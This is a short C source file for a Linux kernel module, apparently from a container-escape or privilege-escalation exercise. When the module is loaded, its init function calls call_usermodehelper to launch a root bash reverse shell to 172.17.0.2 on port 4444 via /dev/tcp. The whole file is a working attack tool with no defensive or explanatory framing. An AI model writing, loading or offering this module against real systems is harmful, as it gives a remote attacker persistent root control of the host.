#include <linux/kmod.h>
#include <linux/module.h>


MODULE_LICENSE( "GPL" );
MODULE_AUTHOR("san3ncrypt3d");

char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1", NULL};

static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };


static int __init reverse_shell_init(void)
{
          return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}


static void __exit reverse_shell_exit(void)
{
          printk(KERN_INFO "exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
